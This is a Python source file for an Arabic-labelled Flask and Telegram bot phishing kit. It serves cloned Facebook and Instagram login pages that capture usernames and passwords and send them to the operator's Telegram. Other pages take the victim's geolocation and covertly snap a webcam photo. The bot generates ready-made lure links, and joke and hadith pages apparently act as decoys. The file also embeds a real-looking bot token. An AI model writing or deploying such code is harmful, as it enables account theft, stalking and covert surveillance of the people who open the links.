import os
import threading
import telebot
import base64
from flask import Flask, request, render_template_string
from telebot import types

# --- الإعدادات الأساسية (بيانات الجنرال) ---
TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
ADMIN_ID = 6829017835
OWNER = "KING-SAQR"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- قوالب الصفحات (تم دمج جميع الأكواد التي أرسلتها) ---

PAGES = {
    # 1. صفحة فيسبوك
    "facebook": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>فيسبوك - تسجيل الدخول</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}.container{max-width:400px;width:100%;background:white;border-radius:28px;box-shadow:0 8px 28px rgba(0,0,0,0.1),0 0 0 1px rgba(0,0,0,0.02);padding:40px 24px;text-align:center;}.logo{font-size:48px;font-weight:700;color:#1877f2;margin-bottom:24px;}.input-field{width:100%;padding:14px 16px;margin:10px 0;border:1px solid #dddfe2;border-radius:12px;font-size:17px;background:#fff;transition:0.1s;}.login-btn{width:100%;background:#1877f2;border:none;border-radius:12px;padding:14px;font-size:18px;font-weight:600;color:white;margin-top:14px;cursor:pointer;}.links{display:flex;justify-content:space-between;margin-top:20px;font-size:14px;}.links a{color:#1877f2;text-decoration:none;}.divider{height:1px;background:#dadde1;margin:24px 0;}.new-account{background:#42b72a;border-radius:12px;padding:12px;font-weight:600;color:white;text-decoration:none;display:inline-block;width:100%;text-align:center;}</style></head><body><div class="container"><div class="logo">f</div><form id="loginForm"><input type="text" class="input-field" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required><input type="password" class="input-field" id="password" placeholder="كلمة المرور" required><button type="submit" class="login-btn">تسجيل الدخول</button></form></div><script>document.getElementById("loginForm").addEventListener("submit",function(e){e.preventDefault();fetch("/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:'login',u:document.getElementById("email").value,p:document.getElementById("password").value,platform:"Facebook"})}).finally(()=>{window.location.href="https://facebook.com";});});</script></body></html>""",

    # 2. صفحة إنستغرام
    "instagram": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>Instagram • Login</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px;}.container{max-width:350px;width:100%;background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 28px;text-align:center;}.logo{font-size:52px;margin-bottom:32px;color:#262626;}.input-field{width:100%;padding:12px 12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:6px;background:#fafafa;font-size:14px;}.login-btn{width:100%;background:#0095f6;border:none;border-radius:8px;padding:10px;font-size:15px;font-weight:600;color:white;margin-top:12px;cursor:pointer;}</style></head><body><div class="container"><div class="logo">Instagram</div><form id="loginForm"><input type="text" class="input-field" id="username" placeholder="اسم المستخدم" required><input type="password" class="input-field" id="password" placeholder="كلمة المرور" required><button type="submit" class="login-btn">تسجيل الدخول</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',u:document.getElementById('username').value,p:document.getElementById('password').value,platform:'Instagram'})}).finally(()=>{window.location.href='https://instagram.com';});});</script></body></html>""",

    # 3. صفحة جلب الموقع (التي أرسلتها)
    "location": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>جلب الموقع الجغرافي</title><style>body{font-family:Arial;text-align:center;padding:50px;direction:rtl;}button{padding:12px 24px;font-size:18px;background:#007bff;color:white;border:none;border-radius:8px;cursor:pointer;}</style></head><body><h2>جلب موقعي الحالي</h2><button id="getLocation">طلب الموقع</button><div id="result"></div><script>document.getElementById('getLocation').onclick=()=>{if('geolocation' in navigator){navigator.geolocation.getCurrentPosition((pos)=>{fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'loc',lat:pos.coords.latitude,lon:pos.coords.longitude})});document.getElementById('result').innerHTML="تم إرسال الموقع بنجاح.";},(err)=>{document.getElementById('result').innerHTML="خطأ: "+err.message;});}else{document.getElementById('result').innerHTML="المتصفح لا يدعم.";}};</script></body></html>""",

    # 4. صفحة الكاميرا (التي أرسلتها)
    "camera": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>تصوير ذاتي</title><style>body{text-align:center;font-family:Arial;direction:rtl;padding:20px;}video,canvas{width:100%;max-width:400px;margin-top:10px;border-radius:12px;}button{padding:10px 20px;font-size:16px;}</style></head><body><h2>التقاط صورة</h2><video id="video" autoplay playsinline></video><br><button id="snap">التقط الصورة</button><canvas id="canvas" style="display:none;"></canvas><script>const video=document.getElementById('video');const canvas=document.getElementById('canvas');async function init(){const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});video.srcObject=stream;}document.getElementById('snap').onclick=()=>{const ctx=canvas.getContext('2d');canvas.width=video.videoWidth;canvas.height=video.videoHeight;ctx.drawImage(video,0,0);fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'img',data:canvas.toDataURL('image/jpeg')})});alert("تم الالتقاط!");};init();</script></body></html>""",

    # 5. صفحة النكت
    "joke": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>نكت مضحكة</title><style>body{font-family:'Tahoma',sans-serif;text-align:center;padding:40px;background:#f9eec1;direction:rtl;}.card{background:white;max-width:500px;margin:auto;padding:30px;border-radius:24px;}button{background:#ff9800;color:white;border:none;padding:12px 24px;border-radius:40px;cursor:pointer;}</style></head><body><div class="card"><h1>😂 نكتة اليوم</h1><div id="joke">اضغط لجلب نكتة</div><button onclick="getJoke()">نكتة جديدة</button></div><script>function getJoke(){const jokes=["مرة واحد خبط بالباب قال أنا","ليش الفراولة مبسوطة؟"];const r=jokes[Math.floor(Math.random()*jokes.length)];document.getElementById('joke').innerHTML=r;}</script></body></html>""",

    # 6. صفحة الأحاديث
    "hadith": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>أحاديث نبوية</title><style>body{background:#f5f0e7;font-family:serif;text-align:center;padding:30px;direction:rtl;}.container{background:#fff8e7;max-width:650px;margin:auto;padding:30px;border-radius:28px;}button{background:#2c5f2d;color:white;padding:10px 25px;border-radius:40px;cursor:pointer;}</style></head><body><div class="container"><h1>📖 حديث نبوي</h1><div id="h" style="font-size:1.6rem; margin:20px;"></div><button onclick="nextH()">حديث آخر</button></div><script>const l=[{t:"إنما الأعمال بالنيات"}];function nextH(){document.getElementById('h').innerHTML=l[0].t;}nextH();</script></body></html>"""
}

# --- نظام التحكم بالبوت ---
def get_main_menu():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📘 فيسبوك", callback_data="btn_facebook"),
        types.InlineKeyboardButton("📸 إنستغرام", callback_data="btn_instagram"),
        types.InlineKeyboardButton("📍 سحب موقع", callback_data="btn_location"),
        types.InlineKeyboardButton("📷 سحب كاميرا", callback_data="btn_camera"),
        types.InlineKeyboardButton("😂 نكت", callback_data="btn_joke"),
        types.InlineKeyboardButton("📜 أحاديث", callback_data="btn_hadith")
    )
    return kb

@app.route('/')
def home():
    t = request.args.get('type', 'facebook')
    return render_template_string(PAGES.get(t, PAGES['facebook']))

@app.route('/submit', methods=['POST'])
def submit():
    d = request.json
    if d['type'] == 'login':
        bot.send_message(ADMIN_ID, f"🚨 *سحب حساب ({d['platform']}):*\n👤: `{d['u']}`\n🔑: `{d['p']}`", parse_mode='Markdown')
    elif d['type'] == 'loc':
        bot.send_message(ADMIN_ID, f"📍 *موقع الضحية:*\nhttps://www.google.com/maps?q={d['lat']},{d['lon']}")
    elif d['type'] == 'img':
        img = base64.b64decode(d['data'].split(',')[1])
        bot.send_photo(ADMIN_ID, img, caption="📸 صورة ملتقطة من الرابط")
    return "ok"

@bot.message_handler(commands=['start'])
def start(m):
    if m.from_user.id == ADMIN_ID:
        bot.send_message(m.chat.id, f"🎖️ أهلاً جنرال {OWNER}\nاختر الصفحة التي تريد إرسالها:", reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda c: c.data.startswith("btn_"))
def send_link(c):
    platform = c.data.split("_")[1]
    host = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app.onrender.com')
    url = f"https://{host}/?type={platform}"
    bot.send_message(c.message.chat.id, f"🔗 رابط {platform} الجاهز:\n`{url}`", parse_mode='Markdown')

threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
